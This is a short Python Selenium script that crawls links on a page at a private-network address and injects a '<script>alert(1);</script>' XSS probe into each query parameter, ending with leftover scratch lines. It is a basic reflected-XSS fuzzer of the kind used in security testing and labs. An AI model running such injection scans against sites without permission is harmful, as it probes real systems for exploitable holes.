import urlparse
import time

from urllib import urlencode
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium import webdriver
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

PAYLOADS = ["<script>alert(1);</script>"]

def get_links(driver):
    return [tag.get_attribute("href") for tag in driver.find_elements_by_tag_name("a") if tag.get_attribute("href")]


driver = webdriver.Firefox(executable_path='drivers/geckodriver')

driver.get("http://172.16.1.203/")
driver.implicitly_wait(1)

links = get_links(driver)

for link in links:
    for payload in PAYLOADS:
        parsed = urlparse.urlparse(link)
        for arg in urlparse.parse_qs(parsed.query).keys():
            params = {arg: payload}
            url_parts = list(urlparse.urlparse(link))
            query = dict(urlparse.parse_qsl(url_parts[4]))
            query.update(params)
            url_parts[4] = urlencode(query)
            urlparse.parse_qs(parsed.query)[arg] = payload
            driver.get((urlparse.urlunparse(url_parts)))
            time.sleep(1)

driver.close()

url = 'http://foo.appspot.com/abc?def=ghi'

print ['def']